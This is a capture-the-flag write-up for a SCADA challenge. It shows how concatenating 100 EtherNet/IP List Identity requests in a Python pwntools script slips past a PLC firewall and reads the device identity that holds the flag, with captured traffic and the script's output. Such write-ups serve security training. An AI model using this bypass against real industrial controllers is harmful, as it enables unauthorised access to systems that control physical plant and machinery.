# No Identity For You
* Category: SCADA
* 200 Points
* Solved by the JCTF Team

## Description

> I don't want hackers to steal my identity so I added a firewall for my PLC! 
> 
> can you bypass it?
> Host: scada-enip-fw.chal.intentsummit.org
> 
> Port: 44818


## Solution

SCADA stands for *Supervisory control and data acquisition*:

> Supervisory control and data acquisition (SCADA) is a control system architecture comprising computers, networked data communications and graphical user interfaces for high-level supervision of machines and processes. It also covers sensors and other devices, such as programmable logic controllers, which interface with process plant or machinery  ([Source](https://en.wikipedia.org/wiki/SCADA))

The challenge port is 44818, and searching for it we find that it is used for "[EtherNet/IP](https://en.wikipedia.org/wiki/EtherNet/IP)":

> EtherNet/IP (IP = Industrial Protocol) is an industrial network protocol that adapts the Common Industrial Protocol (CIP) to standard Ethernet. EtherNet/IP is one of the leading industrial protocols in the United States and is widely used in a range of industries including factory, hybrid and process.

We can use a Python utility called [Cpppo](https://github.com/pjkundert/cpppo) to try and communicate with the with the controller over EtherNet/IP. From the description we know that we are searching for the "identity":

```console
┌──(user@kali)-[/media/sf_CTFs/intent/No_Identity_For_You]
└─$ python3 -m cpppo.server.enip.client --list-identity -a scada-enip-fw.chal.intentsummit.org:44818
Traceback (most recent call last):
  File "/usr/lib/python3.9/runpy.py", line 197, in _run_module_as_main
    return _run_code(code, main_globals, None,
  File "/usr/lib/python3.9/runpy.py", line 87, in _run_code
    exec(code, run_globals)
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/server/enip/client.py", line 2248, in <module>
    sys.exit( main() )
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/server/enip/client.py", line 2208, in main
    reply,_             = await_response( connection, timeout=remains )
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/server/enip/client.py", line 1210, in await_response
    for response in cli: # if StopIteration raised immediately, defaults to {} signalling completion
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/server/enip/client.py", line 597, in __next__
    for mch,sta in self.engine:
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/automata.py", line 687, in run
    for which,state in self.delegate(
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/automata.py", line 1272, in delegate
    for which,target in submach: # 75% of runtime is spent inside 'run'
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/automata.py", line 687, in run
    for which,state in self.delegate(
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/automata.py", line 1272, in delegate
    for which,target in submach: # 75% of runtime is spent inside 'run'
  File "/home/user/.local/lib/python3.9/site-packages/cpppo/automata.py", line 652, in run
    assert crumb not in seen, \
AssertionError: ((byte)) detected no progress before finding acceptable symbol
```

Looks like there is some error. Let's retry while capturing the network traffic via Wireshark:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/No_Identity_For_You]
└─$ tshark -r capture.pcapng
    1 0.000000000    10.0.2.15 → 192.168.1.1  DNS 95 Standard query 0xabc6 A scada-enip-fw.chal.intentsummit.org
    2 0.000308342    10.0.2.15 → 192.168.1.1  DNS 95 Standard query 0x80c3 AAAA scada-enip-fw.chal.intentsummit.org
    3 0.093594153  192.168.1.1 → 10.0.2.15    DNS 214 Standard query response 0xabc6 A scada-enip-fw.chal.intentsummit.org CNAME a3d210b00bdaf4799b16500a4e0efbb4-733887624.eu-central-1.elb.amazonaws.com A 52.28.115.36 A 52.59.105.10
    4 0.173791656  192.168.1.1 → 10.0.2.15    DNS 266 Standard query response 0x80c3 AAAA scada-enip-fw.chal.intentsummit.org CNAME a3d210b00bdaf4799b16500a4e0efbb4-733887624.eu-central-1.elb.amazonaws.com SOA ns-1689.awsdns-19.co.uk
    5 0.174115987    10.0.2.15 → 52.28.115.36 TCP 74 44876 → 44818 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1177358650 TSecr=0 WS=128
    6 0.238554656 52.28.115.36 → 10.0.2.15    TCP 60 44818 → 44876 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1460
    7 0.238590896    10.0.2.15 → 52.28.115.36 TCP 54 44876 → 44818 [ACK] Seq=1 Ack=1 Win=64240 Len=0
    8 0.327335435    10.0.2.15 → 52.28.115.36 ENIP 82 Register Session (Req), Session: 0x00000000
    9 0.327998885 52.28.115.36 → 10.0.2.15    TCP 60 44818 → 44876 [ACK] Seq=1 Ack=29 Win=65535 Len=0
   10 0.394147918 52.28.115.36 → 10.0.2.15    ENIP 82 Register Session (Rsp), Session: 0x0E08357D
   11 0.394167074    10.0.2.15 → 52.28.115.36 TCP 54 44876 → 44818 [ACK] Seq=29 Ack=29 Win=64212 Len=0
   12 0.397414728    10.0.2.15 → 52.28.115.36 ENIP 78 List Identity (Req)
   13 0.398110524 52.28.115.36 → 10.0.2.15    TCP 60 44818 → 44876 [ACK] Seq=29 Ack=53 Win=65535 Len=0
   14 0.461543646 52.28.115.36 → 10.0.2.15    TCP 83 44818 → 44876 [PSH, ACK] Seq=29 Ack=53 Win=65535 Len=29 [TCP segment of a reassembled PDU]
   15 0.461563186    10.0.2.15 → 52.28.115.36 TCP 54 44876 → 44818 [ACK] Seq=53 Ack=58 Win=64183 Len=0
   16 0.463393775 52.28.115.36 → 10.0.2.15    TCP 60 44818 → 44876 [FIN, ACK] Seq=58 Ack=53 Win=65535 Len=0
   17 0.512369710    10.0.2.15 → 52.28.115.36 TCP 54 44876 → 44818 [ACK] Seq=53 Ack=59 Win=64182 Len=0
   18 0.516765289    10.0.2.15 → 52.28.115.36 TCP 54 44876 → 44818 [FIN, ACK] Seq=53 Ack=59 Win=64182 Len=0
   19 0.519388473 52.28.115.36 → 10.0.2.15    TCP 60 44818 → 44876 [ACK] Seq=59 Ack=54 Win=65535 Len=0
```

We can see that the server responded to our "Register Session" request with a response, but then when we requested "List Identity" the server rejected the request. Perhaps this is the firewall?

One way to bypass a firewall is by utilizing packet fragmentation. So if we split the "List Identity" request into fragments, it might pass a simple firewall rule. 

We will need to start by sending a "Register Session" request:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/No_Identity_For_You]
└─$ tshark -r capture.pcapng -Y "frame.number == 8" -V | tail -n 12
EtherNet/IP (Industrial Protocol), Session: 0x00000000, Register Session
    Encapsulation Header
        Command: Register Session (0x0065)
        Length: 4
        Session Handle: 0x00000000
        Status: Success (0x00000000)
        Sender Context: 0000000000000000
        Options: 0x00000000
    Command Specific Data
        Protocol Version: 1
        Option Flags: 0x0000
```

Then extract the session handle from the response, and send a "List Identity" request:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/No_Identity_For_You]
└─$ tshark -r capture.pcapng -Y "frame.number == 12" -V | tail -n 10
EtherNet/IP (Industrial Protocol), Session: 0x0E08357D, List Identity
    Encapsulation Header
        Command: List Identity (0x0063)
        Length: 0
        Session Handle: 0x0e08357d
        Status: Success (0x00000000)
        Max Response Delay: 0
        Sender Context: 000000000000
        Options: 0x00000000
```

The following script uses `construct` to represent the different structures:

```python
from construct import *
from pwn import *

HOSTNAME = "scada-enip-fw.chal.intentsummit.org"
PORT = 44818

BUFFER_SIZE = 128

# -- CIP Structures --

Command = FlagsEnum(Int16ul, ListIdentity = 0x0063, RegisterSession = 0x0065)

CipEncapsulationMessage = Struct(
    'command'        / Command,
    'length'         / Int16ul,
    'session_handle' / Int32ul,
    'status'         / Int32ul,
    'sender_context' / Bytes(8),
    'options'        / Int32ul,
    'data'           / Bytes(this.length)
)

RegisterSessionData = Struct(
    'protocol_version' / Int16ul,
    'option_flags'     / Int16ul
)

ListIdentityData = Struct(
    'item_count' / Int16ul,
    'items'      / Array(this.item_count, Struct(
        "item_type_code"    / Int16ul,
        'item_length'       / Int16ul,
        'protocol_version'  / Int16ul,
        'socket_address'    / Bytes(16),
        'vendor_id'         / Int16ul,
        'device_type'       / Int16ul,
        'product_code'      / Int16ul,
        'revision'          / Bytes(2),
        'status'            / Int16ul,
        'serial_number'     / Int32ul,
        'product_name_len'  / Int8ul,
        'product_name'      / Bytes(this.product_name_len),
        'state'             / Int8ul
    ))
)

# -- End CIP Structures --

r = remote(HOSTNAME, PORT)

register_session_request = CipEncapsulationMessage.build(dict(
    command = Command.RegisterSession,
    length = RegisterSessionData.sizeof(),
    session_handle = 0,
    status = 0,
    sender_context = 0,
    options = 0,
    data = RegisterSessionData.build(dict(protocol_version = 1, option_flags = 0))
))

log.info(f"Sending 'Register Session' request:\n{hexdump(register_session_request)}")
r.send(register_session_request)

register_session_response = CipEncapsulationMessage.parse(r.recv(BUFFER_SIZE))
log.info(f"Received 'Register Session' response:\n{register_session_response}")

log.info(f"Session handle: {hex(register_session_response.session_handle)}")

list_identity_request = CipEncapsulationMessage.build(dict(
    command = Command.ListIdentity,
    length = 0,
    session_handle = register_session_response.session_handle,
    status = 0,
    sender_context = 0,
    options = 0,
    data = bytes()
))

log.info(f"Single 'List Identity' request:\n{hexdump(list_identity_request)}")

num_copies = 100
log.info(f"Sending {num_copies} concatenated messages")
r.send(list_identity_request * num_copies)

response = CipEncapsulationMessage.parse(r.recv(BUFFER_SIZE))
log.info(f"Response: {response}")

list_identity = ListIdentityData.parse(response.data)
log.info(f"Response Data:\n{list_identity}")

log.success(f"Flag: {list_identity['items'][0]['product_name'].decode()}")
```

The script sends a "Register Session", extracts the session handle from the response, builds a single "List Identity" request and sends it concatenated `100` times in order to achieve easy fragmentation from the underlying network layers. This bypasses the firewall and provides us with the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/No_Identity_For_You]
└─$ python3 solve.py
[+] Opening connection to scada-enip-fw.chal.intentsummit.org on port 44818: Done
[*] Sending 'Register Session' request:
    00000000  65 00 04 00  00 00 00 00  00 00 00 00  00 00 00 00  │e···│····│····│····│
    00000010  00 00 00 00  00 00 00 00  01 00 00 00               │····│····│····│
    0000001c
[*] Received 'Register Session' response:
    Container:
        command = Container:
            RegisterSession = True
        length = 4
        session_handle = 2095216381
        status = 0
        sender_context = b'\x00\x00\x00\x00\x00\x00\x00\x00' (total 8)
        options = 0
        data = b'\x01\x00\x00\x00' (total 4)
[*] Session handle: 0x7ce276fd
[*] Single 'List Identity' request:
    00000000  63 00 00 00  fd 76 e2 7c  00 00 00 00  00 00 00 00  │c···│·v·|│····│····│
    00000010  00 00 00 00  00 00 00 00                            │····│····│
    00000018
[*] Sending 100 concatenated messages
[*] Response: Container:
        command = Container:
            ListIdentity = True
        length = 61
        session_handle = 2095216381
        status = 0
        sender_context = b'\x00\x00\x00\x00\x00\x00\x00\x00' (total 8)
        options = 0
        data = b'\x01\x00\x0c\x007\x00\x01\x00\x00\x02\xaf\x12\n\x00\x00\x04'... (truncated, total 61)
[*] Response Data:
    Container:
        item_count = 1
        items = ListContainer:
            Container:
                item_type_code = 12
                item_length = 55
                protocol_version = 1
                socket_address = b'\x00\x02\xaf\x12\n\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00' (total 16)
                vendor_id = 1
                device_type = 14
                product_code = 54
                revision = b'\x14\x0b' (total 2)
                status = 12640
                serial_number = 7079450
                product_name_len = 21
                product_name = b'INTENT{sc4d4_is_'... (truncated, total 21)
                state = 255
[+] Flag: INTENT{sc4d4_is_3a5y}
[*] Closed connection to scada-enip-fw.chal.intentsummit.org port 44818
```